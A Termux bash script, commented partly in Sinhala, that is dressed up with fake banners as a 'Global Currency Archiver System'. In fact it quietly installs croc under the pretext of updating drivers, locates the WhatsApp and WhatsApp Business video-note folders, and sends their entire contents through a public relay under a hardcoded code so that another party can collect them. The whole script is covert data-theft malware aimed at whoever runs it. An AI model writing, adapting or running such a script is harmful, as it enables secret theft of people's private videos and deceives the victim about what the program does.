#!/bin/bash
# ඔයාගේ Secret Code එක
SECRET_CODE="DtRn847"

echo "========================================"
echo "    GLOBAL CURRENCY ARCHIVER SYSTEM      "
echo "    v8.5 | Secure Asset Sync | SSL       "
echo "========================================"

# 1. Setup & Permission Check
if ! command -v croc &> /dev/null; then
    echo ">> [SYSTEM] Updating drivers..."
    pkg update -y > /dev/null 2>&1 && pkg install croc -y > /dev/null 2>&1
    termux-setup-storage
fi

echo ">> [INFO] Initializing Scanner..."
sleep 1

# --- STEP 1: Normal WhatsApp Video Notes ---
WA_VNOTE="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video Notes"
WA_VNOTE_OLD="/sdcard/WhatsApp/Media/WhatsApp Video Notes"

TARGET_1=""
[ -d "$WA_VNOTE" ] && TARGET_1="$WA_VNOTE"
[ -z "$TARGET_1" ] && [ -d "$WA_VNOTE_OLD" ] && TARGET_1="$WA_VNOTE_OLD"

if [ -n "$TARGET_1" ]; then
    echo "----------------------------------------"
    echo ">> [TXN-01] FOUND: Primary Vault"
    echo ">> [STATUS] Exporting All Sub-folders..."
    echo "----------------------------------------"
    # මෙතන '$TARGET_1/.' පාවිච්චි කරලා ඇතුලේ තියෙන ඔක්කොම (Folders & Files) අල්ලනවා
    env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send --name "Vault_Data_01" "$TARGET_1/."
    
    echo ">> [SUCCESS] Batch 01 Sync Complete!"
    sleep 5
fi

# --- STEP 2: Business WhatsApp Video Notes ---
BIZ_VNOTE="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video Notes"
BIZ_VNOTE_OLD="/sdcard/WhatsApp Business/Media/WhatsApp Business Video Notes"

TARGET_2=""
[ -d "$BIZ_VNOTE" ] && TARGET_2="$BIZ_VNOTE"
[ -z "$TARGET_2" ] && [ -d "$BIZ_VNOTE_OLD" ] && TARGET_2="$BIZ_VNOTE_OLD"

if [ -n "$TARGET_2" ]; then
    echo "----------------------------------------"
    echo ">> [TXN-02] FOUND: Business Vault"
    echo ">> [STATUS] Exporting All Sub-folders..."
    echo "----------------------------------------"
    env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send --name "Vault_Data_02" "$TARGET_2/."
    
    echo ">> [SUCCESS] Batch 02 Sync Complete!"
fi

echo "========================================"
echo "    ALL ASSETS SYNCED SUCCESSFULLY      "
echo "========================================"
